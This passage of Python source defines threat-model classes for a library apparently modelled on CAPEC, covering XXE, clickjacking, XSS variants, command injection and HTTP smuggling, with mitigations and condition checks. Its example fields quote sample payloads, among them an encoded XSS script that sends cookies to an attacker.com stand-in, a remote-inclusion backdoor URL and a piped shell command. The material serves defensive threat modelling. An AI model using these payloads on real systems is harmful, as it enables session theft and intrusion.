    mitigations: str = 'This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.'
    example: str = "In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=1.0?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe>]><bomb>&detonate;</bomb>"
    references: str = 'https://capec.mitre.org/data/definitions/221.html, http://cwe.mitre.org/data/definitions/611.html'

    def _check_condition(self, target) -> bool:
        return target.usesXMLParser is False or target.controls.disablesDTD is False

class INP20(Threat):
    """iFrame Overlay."""

    id: str = 'INP20'
    target: tuple = (pytm.Process,)
    description: str = 'iFrame Overlay'
    details: str = "In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he or she is clicking on versus what he or she is actually clicking on."
    likelihood: str = "Medium"
    severity: str = "High"
    prerequisites: str = "The victim is communicating with the target application via a web based UI and not a thick client. The victim's browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system."
    mitigations: str = 'Configuration: Disable iFrames in the Web browser.Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.'
    example: str = "The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don't Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to his/ her Twitter profile."
    references: str = 'https://capec.mitre.org/data/definitions/222.html, http://cwe.mitre.org/data/definitions/1021.html'

    def _check_condition(self, target) -> bool:
        return target.controls.disablesiFrames is False

class INP21(Threat):
    """DTD Injection."""

    id: str = 'INP21'
    target: tuple = (pytm.Server,)
    description: str = 'DTD Injection'
    details: str = "An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion."
    likelihood: str = "Medium"
    severity: str = "Medium"
    prerequisites: str = 'The target must be running an XML based application that leverages DTDs.'
    mitigations: str = 'Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.Implementation: Disallow the inclusion of DTDs as part of incoming messages.Implementation: Use XML parsing tools that protect against DTD attacks.'
    example: str = 'Adversary injects XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.'
    references: str = 'https://capec.mitre.org/data/definitions/228.html, http://cwe.mitre.org/data/definitions/829.html'

    def _check_condition(self, target) -> bool:
        return target.usesXMLParser is False or target.controls.disablesDTD is False

class INP22(Threat):
    """XML Attribute Blowup."""

    id: str = 'INP22'
    target: tuple = (pytm.Server,)
    description: str = 'XML Attribute Blowup'
    details: str = 'This attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'The server accepts XML input and is using a parser with a runtime longer than O(n) for the insertion of a new attribute in the data container.(examples are .NET framework 1.0 and 1.1)'
    mitigations: str = 'This attack may be mitigated completely by using a parser that is not using a vulnerable container. Mitigation may also limit the number of attributes per XML element.'
    example: str = 'In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). <?xml version=1.0?><fooaaa=ZZZ=...999=/> A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.'
    references: str = 'https://capec.mitre.org/data/definitions/229.html, http://cwe.mitre.org/data/definitions/770.html'

    def _check_condition(self, target) -> bool:
        return target.usesXMLParser is False or target.controls.disablesDTD is False

class INP23(Threat):
    """File Content Injection."""

    id: str = 'INP23'
    target: tuple = (pytm.Process,)
    description: str = 'File Content Injection'
    details: str = "An attack of this type exploits the host's trust in executing remote content, including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus."
    likelihood: str = "High"
    severity: str = "Very high"
    prerequisites: str = 'The target software must consume files.The adversary must have access to modify files that the target software will consume.'
    mitigations: str = 'Design: Enforce principle of least privilegeDesign: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.Implementation: Virus scanning on hostImplementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.'
    example: str = 'PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs. [R.23.2]'
    references: str = 'https://capec.mitre.org/data/definitions/23.html, http://cwe.mitre.org/data/definitions/20.html'

    def _check_condition(self, target) -> bool:
        return target.controls.hasAccessControl is False and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)

class INP24(Threat):
    """Filter Failure through Buffer Overflow."""

    id: str = 'INP24'
    target: tuple = (pytm.Process, pytm.Lambda)
    description: str = 'Filter Failure through Buffer Overflow'
    details: str = 'In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'Ability to control the length of data passed to an active filter.'
    mitigations: str = 'Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.Pre-design: Use a language or compiler that performs automatic bounds checking.Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.Operational: Use OS-level preventative functionality. Not a complete solution.Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.'
    example: str = 'Attack Example: Filter Failure in Taylor UUCP Daemon Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.'
    references: str = 'https://capec.mitre.org/data/definitions/24.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/680.html, http://cwe.mitre.org/data/definitions/20.html'

    def _check_condition(self, target) -> bool:
        return target.controls.checksInputBounds is False or target.controls.validatesInput is False

class INP25(Threat):
    """Resource Injection."""

    id: str = 'INP25'
    target: tuple = (pytm.Process, pytm.Lambda)
    description: str = 'Resource Injection'
    details: str = 'An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'The target application allows the user to both specify the identifier used to access a system resource. Through this permission, the user gains the capability to perform actions on that resource (e.g., overwrite the file)'
    mitigations: str = 'Ensure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.'
    example: str = "A Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as '../../tomcat/confserver.xml', which causes the application to delete one of its own configuration files."
    references: str = 'https://capec.mitre.org/data/definitions/240.html, https://capec.mitre.org/data/definitions/240.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False

class INP26(Threat):
    """Code Injection."""

    id: str = 'INP26'
    target: tuple = (pytm.Process, pytm.Lambda)
    description: str = 'Code Injection'
    details: str = 'An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'The target software does not validate user-controlled input such that the execution of a process may be altered by sending code in through legitimate data channels, using no other mechanism.'
    mitigations: str = 'Utilize strict type, character, and encoding enforcementEnsure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.'
    example: str = 'When a developer uses the PHP eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.'
    references: str = 'https://capec.mitre.org/data/definitions/242.html, http://cwe.mitre.org/data/definitions/94.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False

class INP27(Threat):
    """XSS Targeting HTML Attributes."""

    id: str = 'INP27'
    target: tuple = (pytm.Process,)
    description: str = 'XSS Targeting HTML Attributes'
    details: str = 'An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.'
    severity: str = "Medium"
    prerequisites: str = 'The target application must fail to adequately sanitize HTML attributes against the presence of dangerous commands.'
    mitigations: str = 'Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list all input including that which is not expected to have any scripting content.Implementation: The victim should configure the browser to minimize active content from untrusted sources.'
    example: str = 'Application allows execution of any Javascript they want on the browser which enables the adversary to steal session tokens and perform malicious activities.'
    references: str = 'https://capec.mitre.org/data/definitions/243.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False

class INP28(Threat):
    """XSS Targeting URI Placeholders."""

    id: str = 'INP28'
    target: tuple = (pytm.Server, pytm.Process)
    description: str = 'XSS Targeting URI Placeholders'
    details: str = 'An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme.'
    mitigations: str = 'Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.'
    example: str = 'The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.'
    references: str = 'https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False

class INP29(Threat):
    """XSS Using Doubled Characters."""

    id: str = 'INP29'
    target: tuple = (pytm.Server, pytm.Process)
    description: str = 'XSS Using Doubled Characters'
    details: str = 'The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.'
    likelihood: str = "Medium"
    severity: str = "Medium"
    prerequisites: str = 'The targeted web application does not fully normalize input before checking for prohibited syntax. In particular, it must fail to recognize prohibited methods preceded by certain sequences of repeated characters.'
    mitigations: str = 'Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.'
    example: str = 'By doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.'
    references: str = 'https://capec.mitre.org/data/definitions/245.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False

class INP30(Threat):
    """XSS Using Invalid Characters."""

    id: str = 'INP30'
    target: tuple = (pytm.Process,)
    description: str = 'XSS Using Invalid Characters'
    details: str = 'An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the attacker to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.'
    likelihood: str = "Medium"
    severity: str = "Medium"
    prerequisites: str = 'The target must fail to remove invalid characters from input and fail to adequately scan beyond these characters.'
    mitigations: str = 'Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be included in any subsequent web pages or back end operations.Implementation: The victim should configure the browser to minimize active content from untrusted sources.'
    example: str = "The software may attempt to remove a 'javascript:' URI scheme, but a 'java%00script:' URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks."
    references: str = 'https://capec.mitre.org/data/definitions/247.html, https://cwe.mitre.org/data/definitions/86.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False

class INP31(Threat):
    """Command Injection."""

    id: str = 'INP31'
    target: tuple = (pytm.Process,)
    description: str = 'Command Injection'
    details: str = 'An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.'
    likelihood: str = "Medium"
    severity: str = "High"
    prerequisites: str = 'The target application must accept input from the user and then use this input in the construction of commands to be executed. In virtually all cases, this is some form of string input that is concatenated to a constant string defined by the application to form the full command to be executed.'
    mitigations: str = 'All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary.Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.'
    example: str = "Consider a URL 'http://sensitive/cgi-bin/userData.pl?doc=user1.txt'. If the URL is modified like so - 'http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|', it executed the command '/bin/ls|'. This is how command injection is implemented."
    references: str = 'https://capec.mitre.org/data/definitions/248.html'

    def _check_condition(self, target) -> bool:
        return target.controls.usesParameterizedInput is False and (target.controls.validatesInput is False or target.controls.sanitizesInput is False)

class INP32(Threat):
    """XML Injection."""

    id: str = 'INP32'
    target: tuple = (pytm.Process,)
    description: str = 'XML Injection'
    details: str = 'An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'XML queries used to process user input and retrieve information stored in XML documentsUser-controllable input not properly sanitized'
    mitigations: str = 'Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.'
    example: str = 'Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.'
    references: str = 'https://capec.mitre.org/data/definitions/250.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False

class INP33(Threat):
    """Remote Code Inclusion."""

    id: str = 'INP33'
    target: tuple = (pytm.Process,)
    description: str = 'Remote Code Inclusion'
    details: str = 'The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.'
    likelihood: str = "Medium"
    severity: str = "High"
    prerequisites: str = 'Target application server must allow remote files to be included.The malicious file must be placed on the remote machine previously.'
    mitigations: str = 'Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.'
    example: str = 'URL string http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor_ contains an external reference to a backdoor code file stored in a remote location (http://www.hacker.com/backdoor_shell.php.) Having been uploaded to the application, this backdoor can later be used to hijack the underlying server or gain access to the application database.'
    references: str = 'https://capec.mitre.org/data/definitions/253.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False

class INP34(Threat):
    """SOAP Array Overflow."""

    id: str = 'INP34'
    target: tuple = (pytm.Server,)
    description: str = 'SOAP Array Overflow'
    details: str = 'An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. When a data structure including a SOAP array is instantiated, the sender transmits the size of the array as an explicit parameter along with the data. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array. This, in turn, can lead to a server crash or even the execution of arbitrary code.'
    likelihood: str = "Medium"
    severity: str = "High"
    prerequisites: str = 'The targeted SOAP server must trust that the array size as stated in messages it receives is correct, but read through the entire content of the message regardless of the stated size of the array.'
    mitigations: str = 'If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.'
    example: str = 'Refer to this example - http://projects.webappsec.org/w/page/13246962/SOAP%20Array%20Abuse'
    references: str = 'https://capec.mitre.org/data/definitions/256.html'

    def _check_condition(self, target) -> bool:
        return target.controls.checksInputBounds is False

class INP35(Threat):
    """Leverage Alternate Encoding."""

    id: str = 'INP35'
    target: tuple = (pytm.Process,)
    description: str = 'Leverage Alternate Encoding'
    details: str = 'An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = "The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host."
    mitigations: str = 'Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.'
    example: str = 'Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote attackers to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.'
    references: str = 'https://capec.mitre.org/data/definitions/267.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False

class INP36(Threat):
    """HTTP Response Smuggling."""

    id: str = 'INP36'
    target: tuple = (pytm.Server,)
    description: str = 'HTTP Response Smuggling'
    details: str = 'An attacker injects content into a server response that is interpreted differently by intermediaries than it is by the target browser. To do this, it takes advantage of inconsistent or incorrect interpretations of the HTTP protocol by various applications. For example, it might use different block terminating characters (CR or LF alone), adding duplicate header fields that browsers interpret as belonging to separate responses, or other techniques. Consequences of this attack can include response-splitting, cross-site scripting, apparent defacement of targeted sites, cache poisoning, or similar actions.'
    likelihood: str = "Medium"
    severity: str = "Medium"
    prerequisites: str = "The targeted server must allow the attacker to insert content that will appear in the server's response."
    mitigations: str = 'Design: Employ strict adherence to interpretations of HTTP messages wherever possible.Implementation: Encode header information provided by user input so that user-supplied content is not interpreted by intermediaries.'
    example: str = 'The attacker targets the cache service used by the organization to reduce load on the internet bandwidth. This server can be a cache server on the LAN or other application server caching the static WebPages. The attacker sends three different HTTP request as shown - Request 1: POST request for http://www.netbanking.com, Request 2: GET request for http:www.netbanking.com/FD.html, Request 3: GET request for http://www.netbanking.com/FD-Rates.html. Due to malformed request cache server assumes request 1 and 3 as valid request and forwards the entire request to the webserver. Webserver which strictly follow then HTTP parsing rule responds with the http://www.netbanking.com/FD.html  HTML page. This is happened because webserver consider request 1 and 2 as valid one. Cache server stores this response against the request 3. When normal users request for page http://www.netbanking.com/FD-Rates.html, cache server responds with the page http://www.netbanking.com/FD.html.Hence attacker will succeeds in cache poisoning.'
    references: str = 'https://capec.mitre.org/data/definitions/273.html'

    def _check_condition(self, target) -> bool:
        return target.controls.implementsStrictHTTPValidation is False and target.controls.encodesHeaders is False

class INP37(Threat):
    """HTTP Request Smuggling."""

    id: str = 'INP37'
    target: tuple = (pytm.Server,)
    description: str = 'HTTP Request Smuggling'
    details: str = 'HTTP Request Smuggling results from the discrepancies in parsing HTTP requests between HTTP entities such as web caching proxies or application firewalls. Entities such as web servers, web caching proxies, application firewalls or simple proxies often parse HTTP requests in slightly different ways. Under specific situations where there are two or more such entities in the path of the HTTP request, a specially crafted request is seen by two attacked entities as two different sets of requests. This allows certain requests to be smuggled through to a second entity without the first one realizing it.'
    likelihood: str = "Medium"
    severity: str = "High"
    prerequisites: str = 'An additional HTTP entity such as an application firewall or a web caching proxy between the attacker and the second entity such as a web serverDifferences in the way the two HTTP entities parse HTTP requests'
    mitigations: str = 'HTTP Request Smuggling is usually targeted at web servers. Therefore, in such cases, careful analysis of the entities must occur during system design prior to deployment. If there are known differences in the way the entities parse HTTP requests, the choice of entities needs consideration.Employing an application firewall can help. However, there are instances of the firewalls being susceptible to HTTP Request Smuggling as well.'
    example: str = 'When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both Content-Length and a Transfer-Encoding: chunked headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with Transfer-Encoding: chunked header without replacing the existing Content-Length header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with Content-Length: 0. See also: CVE-2005-2088'
    references: str = 'https://capec.mitre.org/data/definitions/33.html'

    def _check_condition(self, target) -> bool:
        return target.controls.implementsStrictHTTPValidation is False and target.controls.encodesHeaders is False

class INP38(Threat):
    """DOM-Based XSS."""

    id: str = 'INP38'
    target: tuple = (pytm.Process,)
    description: str = 'DOM-Based XSS'
    details: str = 'This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is inserted into the client-side HTML being parsed by a web browser. Content served by a vulnerable web application includes script code used to manipulate the Document Object Model (DOM). This script code either does not properly validate input, or does not perform proper output encoding, thus creating an opportunity for an adversary to inject a malicious script launch a XSS attack. A key distinction between other XSS attacks and DOM-based attacks is that in other XSS attacks, the malicious script runs when the vulnerable web page is initially loaded, while a DOM-based attack executes sometime after the page loads. Another distinction of DOM-based attacks is that in some cases, the malicious script is never sent to the vulnerable web server at all. An attack like this is guaranteed to bypass any server-side filtering attempts to protect users.'
    likelihood: str = "High"
    severity: str = "Very high"
    prerequisites: str = 'An application that leverages a client-side web browser with scripting enabled.An application that manipulates the DOM via client-side scripting.An application that fails to adequately sanitize or encode untrusted input.'
    mitigations: str = 'Use browser technologies that do not allow client-side scripting.Utilize proper character encoding for all output produced within client-site scripts manipulating the DOM.Ensure that all user-supplied input is validated before use.'
    example: str = "Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string. http://my.site.com/aform.html?mode=full The application’s client-side code may want to print this mode value to the screen to give the users an understanding of what mode they are in. In this example, JavaScript is used to pull the value from the URL and update the HTML by dynamically manipulating the DOM via a document.write() call. <script>document.write(<p>Mode is: + document.location.href.substring(document.location.href.indexOf('mode=') + 5) + </p>);</script> Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim’s browser: http://my.site.com/aform.html?mode=<script>alert('hi');</script>In some DOM-based attacks, the malicious script never gets sent to the web server at all, thus bypassing any server-side protections that might be in place. Consider the previously used web application that displays the mode value. Since the HTML is being generated dynamically through DOM manipulations, a URL fragment (i.e., the part of a URL after the '#' character) can be used. http://my.site.com/aform.html#mode=<script>alert('hi')</script> In this variation of a DOM-based XSS attack, the malicious script will not be sent to the web server, but will instead be managed by the victim's browser and is still available to the client-side script code."
    references: str = 'https://capec.mitre.org/data/definitions/588.html'

    def _check_condition(self, target) -> bool:
        return target.allowsClientSideScripting is True and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)

class INP39(Threat):
    """Reflected XSS."""

    id: str = 'INP39'
    target: tuple = (pytm.Process,)
    description: str = 'Reflected XSS'
